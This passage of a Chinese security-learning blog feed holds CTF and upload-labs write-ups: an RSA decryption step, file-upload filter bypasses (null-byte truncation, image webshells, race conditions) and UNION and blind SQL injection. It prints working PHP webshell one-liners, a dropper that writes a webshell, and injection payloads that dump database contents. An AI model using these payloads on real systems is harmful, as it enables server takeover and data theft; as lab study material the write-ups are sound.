src="http://img-blog.csdnimg.cn/20190806113205367.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>即p=275127860351348928173285174381581152299、q=319576316814478949870590164193048041239</p><p><strong>3、用RSAtools生成私钥文件private.pem</strong><br>命令：</p><pre><code>python rsatool.py -o private.pem -e 65537 -p 275127860351348928173285174381581152299 -q 319576316814478949870590164193048041239</code></pre><p><img src="http://img-blog.csdnimg.cn/20190806230436837.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20190806230451405.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>4、用生成的private.pem和OpenSSL对flag.enc文件进行解密</strong><br>命令：</p><pre><code>openssl rsautl -decrypt -in flag.enc -inkey private.pem</code></pre><p><img src="http://img-blog.csdnimg.cn/20190806230503980.jpg" alt="在这里插入图片描述"><br>得到flag</p><h3 id="感悟"><a href="#感悟" class="headerlink" title="感悟"></a>感悟</h3><p>学习了RSA加密算法之后，对RSA加密解密有了认识。同时为了能顺利使用rsatool，特意又搭了Kali虚拟机。<br>果然Kali真的是强大的一批。小白进阶ing</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传漏洞 学习笔记(二)</title>
      <link href="/2019/08/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%BA%8C)/"/>
      <url>/2019/08/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%BA%8C)/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>之前已经总结了一部分文件上传漏洞，现在继续总结剩余的另一部分。</p><h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>漏洞环境依旧用的upload-labs。</p><h4 id="四、白名单限制文件上传"><a href="#四、白名单限制文件上传" class="headerlink" title="四、白名单限制文件上传"></a>四、白名单限制文件上传</h4><h5 id="文件截断绕过"><a href="#文件截断绕过" class="headerlink" title="文件截断绕过"></a>文件截断绕过</h5><p><strong>%00截断</strong><br>类型：PHP %00截断<br>原理：因为<code>00</code>代表结束符，所以会把00后面的所有字符删除<br>条件：PHP版本小于5.3.4，PHP的magic_quotes_gpc为OFF状态<br><strong>常见的截断上传</strong><br>0x00，%00，/00 截断的核心在于chr(0)这个字符，这个函数表示返回以数值表达式值为编码的字符。char(0)表示的ascll字符是null，当程序输出包含chr(0)变量时，chr(0)后面的数据会被截断，后面的数据直接忽略，导致漏洞产生。</p><h5 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h5><p>查看源码</p><pre><code class="php">$is_upload = false;$msg = null;if(isset($_POST[&#39;submit&#39;])){    $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);    $file_ext = substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);    if(in_array($file_ext,$ext_arr)){        $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];        $img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;        if(move_uploaded_file($temp_file,$img_path)){            $is_upload = true;        } else {            $msg = &#39;上传出错！&#39;;        }    } else{        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;    }}</code></pre><p>是白名单判断，但$img_path直接拼接，所以可以利用%00截断绕过，上传webshell。<br>因为我的ubantu虚拟机PHP版本大于5.3.4，所以直接在windows进行测试。<br>因为之前没用过，所以先配置一下：<br>1、<a href="http://www.cnblogs.com/slpawn/p/7235105.html" target="_blank" rel="noopener">Firefox+Burpsuite抓包配置</a><br>2、设置PHP版本<br><img src="http://img-blog.csdnimg.cn/20190802191846441.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>3、magic_quotes_gpc调为OFF：<a href="http://www.hadsky.com/read-1320-1.html" target="_blank" rel="noopener">magic_quotes_gpc函数的关闭方法</a></p><p>配置结束，开始上传webshell.jpg，抓包，添加webshell.php%00<br><img src="http://img-blog.csdnimg.cn/20190802195848452.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>Forward发包，上传成功<br><img src="http://img-blog.csdnimg.cn/20190802200104862.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>测试连接，连接成功<br><img src="http://img-blog.csdnimg.cn/20190802200317402.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h5><p>查看源码，还是白名单判断，还是利用00截断。但save_path是通过post传进来的，post不会像get对%00进行自动解码，所以需要在二进制中进行修改。<br><img src="http://img-blog.csdnimg.cn/20190802214401972.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20190802214433325.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>空格的十六进制是20 ，将0x20 改成0x00 也就是00<br><img src="http://img-blog.csdnimg.cn/20190802214500986.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击Go，上传成功<br><img src="http://img-blog.csdnimg.cn/20190802214708404.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>测试连接，连接成功<br><img src="http://img-blog.csdnimg.cn/20190802214816604.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="五、内容限制文件上传"><a href="#五、内容限制文件上传" class="headerlink" title="五、内容限制文件上传"></a>五、内容限制文件上传</h4><h5 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h5><p><img src="http://img-blog.csdnimg.cn/2019080222180554.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>要求上传图片马，查看源码</p><pre><code class="php">function getReailFileType($filename){    $file = fopen($filename, &quot;rb&quot;);    $bin = fread($file, 2); //只读2字节    fclose($file);    $strInfo = @unpack(&quot;C2chars&quot;, $bin);        $typeCode = intval($strInfo[&#39;chars1&#39;].$strInfo[&#39;chars2&#39;]);        $fileType = &#39;&#39;;        switch($typeCode){              case 255216:                        $fileType = &#39;jpg&#39;;            break;        case 13780:                        $fileType = &#39;png&#39;;            break;                case 7173:                        $fileType = &#39;gif&#39;;            break;        default:                        $fileType = &#39;unknown&#39;;        }            return $fileType;}$is_upload = false;$msg = null;if(isset($_POST[&#39;submit&#39;])){    $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];    $file_type = getReailFileType($temp_file);    if($file_type == &#39;unknown&#39;){        $msg = &quot;文件未知，上传失败！&quot;;    }else{        $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type;        if(move_uploaded_file($temp_file,$img_path)){            $is_upload = true;        } else {            $msg = &quot;上传出错！&quot;;        }    }}</code></pre><p>分析代码，通过读文件的前2个字节判断文件类型，因此直接上传图片马即可，</p><h5 id="图片马制作方法"><a href="#图片马制作方法" class="headerlink" title="图片马制作方法"></a>图片马制作方法</h5><p>方法一：<code>copy normal.jpg /b + shell.php /a webshell.jpg</code><br>这里，b代表二进制，a代表ascii编码<br>方法二：<code>exiftool -Comment=&#39;&lt;?php echo &quot;&lt;pre&gt;&quot;; system($_GET[&#39;cmd&#39;]); ?&gt;&#39; 1.jpg</code></p><p>我采用方法一先制作个图片马webshell.jpg(为了方便以后关卡一般直尝试jpg图片马)<br><img src="http://img-blog.csdnimg.cn/20190802225041930.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>上传<code>webshell.jpg</code>，不用抓包改包，上传成功<br><img src="http://img-blog.csdnimg.cn/20190802225902623.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>测试连接，连接失败，发现文件名被替换。一般使用BurpSuite的Repeater进行发包上传，方便查看被修改后的文件名。这里我用的本地搭建的环境，直接查看就行了。<br><img src="http://img-blog.csdnimg.cn/2019080223054322.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>重新输入图片马的文件名，测试连接，连接成功。表示该图片上传成功，但并不意味者可以进行利用<br><img src="http://img-blog.csdnimg.cn/20191015233746644.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>利用的话，还需要结合文件包含漏洞。这个靶场环境自带了个文件包含文件内容如下：</p><pre><code class="php">&lt;?php/*本页面存在文件包含漏洞，用于测试图片马是否能正常运行！*/header(&quot;Content-Type:text/html;charset=utf-8&quot;);$file = $_GET[&#39;file&#39;];if(isset($file)){    include $file;}else{    show_source(__file__);}?&gt;</code></pre><p>在php中，使用include,require、include_once、require_once函数包含的文件，会被当做php代码执行。无论文件的名称是什么，只要文件内容符合PHP代码规范，都会被当作PHP代码执行。<br><img src="http://img-blog.csdnimg.cn/20191016003451310.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt><br>列出目录<br><img src="http://img-blog.csdnimg.cn/20191016003505204.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt></p><h5 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h5><p>依旧是上传图片马，查看源码</p><pre><code class="sql">function isImage($filename){    $types = &#39;.jpeg|.png|.gif&#39;;    if(file_exists($filename)){        $info = getimagesize($filename);        $ext = image_type_to_extension($info[2]);        if(stripos($types,$ext)&gt;=0){            return $ext;        }else{            return false;        }    }else{        return false;    }}</code></pre><p>这里用的是<code>getimagesize</code>获取文件类型，还是直接可以利用图片马就可以绕过。<br>还用Pass-13制作的那个图片马，上传成功，连接成功。利用的话，结合文件包含漏洞。</p><p>当然查看有关信息发现可以图片头绕过，具体操作如下：<br>将PHP木马文件，改成<code>*.php;.jpg</code><br>抓包，给文件头部加上：GIF89a 图片头标识</p><h5 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h5><p>查看源码</p><pre><code class="php">function isImage($filename){    //需要开启php_exif模块    $image_type = exif_imagetype($filename);    switch ($image_type) {        case IMAGETYPE_GIF:            return &quot;gif&quot;;            break;        case IMAGETYPE_JPEG:            return &quot;jpg&quot;;            break;        case IMAGETYPE_PNG:            return &quot;png&quot;;            break;            default:            return false;            break;    }}</code></pre><p>利用php_exif模块判断文件类型，还是直接利用图片马就可以绕过。<br>上传图片马，在windows上上传有问题。所以打开ubantu漏洞环境上传，上传成功<br><img src="http://img-blog.csdnimg.cn/20190802233659378.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看文件名<br><img src="http://img-blog.csdnimg.cn/20190802233847670.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>测试连接，连接成功。利用的话，结合文件包含漏洞。</p><h5 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h5><p>依旧是上传图片马，上传、查看文件名(正常情况下是用代理工具(如：BurpSuite)查看文件名)<br><img src="http://img-blog.csdnimg.cn/20190802234603734.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>测试连接、连接成功。利用的话，结合文件包含漏洞。<br>不过查看源码发现，综合判断了后缀名、content-type，以及利用imagecreatefromgif判断是否为gif图片，最后再做了一次二次渲染，绕过方法(不想尝试，这里借用大佬的一张图)：<br><img src="http://img-blog.csdnimg.cn/20190802235710965.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="六、竞争条件攻击"><a href="#六、竞争条件攻击" class="headerlink" title="六、竞争条件攻击"></a>六、竞争条件攻击</h4><p><strong>竞争条件攻击存在的原因：</strong><br>一些网站上传逻辑是先允许上传任意文件，然后检查上传文件是否包含WebShell脚本，如果包含则删除该文件。文件上传成功后和删除文件之间存在短的时间差。攻击者可以利用这个时间差完成竞争条件的上传漏洞攻击。<br><strong>攻击过程：</strong><br>攻击者先上传一个webshell脚本<code>shell.php</code>，<code>shell.php</code>的内容是生成一个新的webshell脚本<code>webshell.php</code><br>shell.php代码如下：</p><pre><code class="php">&lt;?phpfputs(fopen(&#39;../webshell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&#39;a&#39;]);?&gt;&#39;);?&gt;</code></pre><p><code>shell.php</code>上传成功后，客户端立即访问shell.php，则会在当前目录下自动生成<code>webshell.php</code>，这时攻击者就利用时间差完成webshell的上传。</p><h5 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h5><p>查看源码</p><pre><code class="php">$is_upload = false;$msg = null;if(isset($_POST[&#39;submit&#39;])){    $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);    $file_name = $_FILES[&#39;upload_file&#39;][&#39;name&#39;];    $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];    $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1);    $upload_file = UPLOAD_PATH . &#39;/&#39; . $file_name;    if(move_uploaded_file($temp_file, $upload_file)){        if(in_array($file_ext,$ext_arr)){             $img_path = UPLOAD_PATH . &#39;/&#39;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;             rename($upload_file, $img_path);             $is_upload = true;        }else{            $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;            unlink($upload_file);        }    }else{        $msg = &#39;上传出错！&#39;;    }}</code></pre><p>这里先将文件上传到服务器，然后通过rename修改名称，再通过unlink删除文件，因此可以通过条件竞争的方式在unlink之前，访问webshell。<br>首先在burp中不断发送上传webshell的数据包，然后不断在浏览器中访问，发现通过竞争可以访问到。<br>(不会不断发送上传webshell的数据包，没有复现成功)<br><a href="http://blog.csdn.net/weixin_40709439/article/details/82743951" target="_blank" rel="noopener">upload-labs17</a></p><h5 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h5><p>本关需要上传图片马，查看代码发现：<br>对文件后缀名做了白名单判断，然后会一步一步检查文件大小、文件是否存在等等，将文件上传后，对文件重新命名，同样存在条件竞争的漏洞。可以不断利用burp发送上传图片马的数据包，由于条件竞争，程序会出现来不及rename的问题，从而上传成功</p><p>依旧用<code>webshell.jpg</code>图片马测试，发送上传图片马的数据包<br><img src="http://img-blog.csdnimg.cn/20190803012725846.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="CVE-2015-2348-move-uploaded-file-00截断"><a href="#CVE-2015-2348-move-uploaded-file-00截断" class="headerlink" title="CVE-2015-2348 move_uploaded_file() 00截断"></a>CVE-2015-2348 move_uploaded_file() 00截断</h4><h5 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h5><p>考察CVE-2015-2348 move_uploaded_file() 00截断，上传webshell，同时自定义保存名称，直接保存为php是不行的<br>查看源码，发现move_uploaded_file()函数中的img_path是由post参数save_name控制的，因此可以在save_name利用00截断绕过。上传的文件名用0x00绕过。改成*.php【二进制00】.1.jpg，上传文件名改成要自己定义。<br>也可以上传<code>webshell.php/.</code>绕过<br>下面用的windows的漏洞环境。两个文件名中间留一个空格<br><img src="http://img-blog.csdnimg.cn/20190803014926329.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>将0x20改为0x00<br><img src="http://img-blog.csdnimg.cn/20190803015051544.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>Forword发包，上传成功。<br><img src="http://img-blog.csdnimg.cn/20190803015147765.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>测试连接，连接成功<br><img src="http://img-blog.csdnimg.cn/20190803015511590.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="感悟"><a href="#感悟" class="headerlink" title="感悟"></a>感悟</h3><p>好了，总结完毕，总算了解完文件上传漏洞的各种绕过姿势，收获很大。<br>继续努力，小白进阶ing。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
          <category> 文件上传漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 白名单绕过 </tag>
            
            <tag> 内容绕过 </tag>
            
            <tag> 竞争条件绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF做题总结(二)</title>
      <link href="/2019/08/02/CTF%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93(%E4%BA%8C)/"/>
      <url>/2019/08/02/CTF%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93(%E4%BA%8C)/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近这段时间在内部平台上做了一些Web题，和最基础的Reverse签到题。虽说还有两道Reverse题没做出来，但还是先总结一下吧！</p><h3 id="Web1：BASE-INJECT"><a href="#Web1：BASE-INJECT" class="headerlink" title="Web1：BASE-INJECT"></a>Web1：BASE-INJECT</h3><p><img src="http://img-blog.csdnimg.cn/20190801154112122.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看题目提示，就知道这道题之前做过，不过当时没总结，现在总结一下。<br>题目的意思是注入。点开题目<br><img src="http://img-blog.csdnimg.cn/20190801155023647.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现输入id可以查信息，并且是get传参方式。<br><strong>判断是否存在sql注入</strong><br>判断方法在sqlilabs攻关总结中总结过。就不叙述了。这里我选用<strong>get单引号判断</strong><br>输入?id=1显示正常<br>输入?id=1’显示错误，所以存在sql注入<br><img src="http://img-blog.csdnimg.cn/20190801160202792.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>并且有显示位，所以应该是SQL注入-联合查询注入。</p><h4 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h4><p><strong>前提</strong><br>要用联合查询进行注入则：页面必须有显示位<br><strong>显示位(查字段)</strong><br>在一个网站的正常页面，服务器执行sql语句查询数据库中的数据，客户端将数据展示在页面中，这个暂时数据的位置就是显示位。<br><strong>联合查询</strong><br>union可合并两个或多个select语句的结果集，如：</p><pre><code class="sql">select id,username,password from users where id=1 union select 1,2,3;</code></pre><p>前提是两个select必有相同列、且各列的数据类型也相同<br><strong>union注入条件</strong><br>只有最后一个select子句允许有order by<br>只有最后一个select子句允许有limit<br>只要union连接的几个查询的字段数一样且列的数据类型转换没有问题，就可以查询出结果<br>注入点页面有回显<br><strong>注入步骤</strong></p><ol><li>判断是整型还是字符型</li><li>判断查询列数</li><li>判断显示位</li><li>获取所有数据库名</li><li>获取数据库所有表名</li><li>获取字段名</li><li>获取字段中的数据</li></ol><p>知识了解完毕，开始解题<br><strong>1.判断是整型还是字符型</strong><br>输入<code>?id=1 and 1=1</code><br>输入<code>?id=1 and 1=2</code><br>回显页面不同，说明是整型注入<br><strong>2.判断查询列数</strong><br>输入<code>?id=1 order by 3 --+</code> 显示正常<br>再次输入<code>?id=1 order by 4 --+</code> 显示错误<br>所以在?id=1查看的这个表有3列，即3个字段<br><img src="http://img-blog.csdnimg.cn/20190801160439886.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20190802131301325.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> <strong>3. 判断显示位</strong><br><img src="http://img-blog.csdnimg.cn/20190801163755987.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>1、2、3处，即是显示位。<br> <strong>4. 获取所有数据库名</strong><br><strong>group_concat()一次性显示：</strong> </p><pre><code class="sql">1 union select 1,2,group_concat(SCHEMA_NAME) from information_schema.SCHEMATA--+</code></pre><p><img src="http://img-blog.csdnimg.cn/20190801170144388.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>显示当前数据库：</strong> <code>database()</code></p><pre><code class="sql">1 union select 1,2,database()--+</code></pre><p><img src="http://img-blog.csdnimg.cn/20190801170316601.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> <strong>5. 获取数据库所有表名</strong></p><pre><code class="sql">1 union select 1,2,group_concat(TABLE_NAME) from information_schema.TABLES WHERE TABLE_SCHEMA=database() --+</code></pre><p><img src="http://img-blog.csdnimg.cn/20190801170714547.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>6. 获取字段名</strong></p><pre><code class="sql">1 union select 1,2,group_concat(COLUMN_NAME) from information_schema.COLUMNS WHERE TABLE_SCHEMA=database() and TABLE_NAME=&#39;users&#39; --+</code></pre><p><img src="http://img-blog.csdnimg.cn/20190801171209416.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> <strong>7. 获取字段中的数据</strong></p><pre><code class="sql">1 union select 1,2,group_concat(username) from users --+</code></pre><p><img src="http://img-blog.csdnimg.cn/20190801171703937.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到flag。</p><h3 id="Web2：BASE-Blind-Inject"><a href="#Web2：BASE-Blind-Inject" class="headerlink" title="Web2：BASE-Blind-Inject"></a>Web2：BASE-Blind-Inject</h3><p><img src="http://img-blog.csdnimg.cn/2019080117231722.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>“BASE-Blind-Inject”意思是“基础盲注”。盲注知识之前我已经总结过，所以直接做题<br>打开题目，发现是登录框。想到SQL的简单注入，试一下闭合方式，最后发现是双引号闭合<br>payload</p><pre><code class="sql">&quot; or 1=1#</code></pre><p><img src="http://img-blog.csdnimg.cn/20190801172901143.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>flag在数据库？！并且输错回显不同，再结合题目“基础盲注”，所以很明显是布尔盲注，并且是POST型的。<br>所以开始构造针对此题的布尔盲注pyload<br><strong>盲注方法：</strong></p><ol><li>最慢：可以采用二分法的方式，手工进行盲注，对数据库名的每一个字符进行猜解(在浏览器进行测试有点不方便，可以用Burpsuite抓包，使用Repeater进行测试)<br>参考：<br><a 